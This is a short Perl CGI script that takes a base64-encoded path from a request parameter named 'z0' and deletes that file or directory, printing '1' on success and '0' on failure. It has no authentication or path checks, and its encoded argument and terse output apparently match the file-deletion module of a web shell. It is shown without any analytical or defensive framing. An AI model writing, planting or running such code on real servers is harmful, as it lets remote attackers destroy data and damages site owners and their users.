use strict;
use warnings;
use CGI;
use MIME::Base64;

sub main {
    my $q = CGI->new;
    my $z0 = $q->param('z0') // '';
    
    my $sz_entry = decode_base64($z0);

    eval {
        if (-d $sz_entry) {
            rmdir($sz_entry) or die;
        } else {
            unlink($sz_entry) or die;
        }
        
        print "1";
        1;
    } or do {
        print "0";
    };
}

main();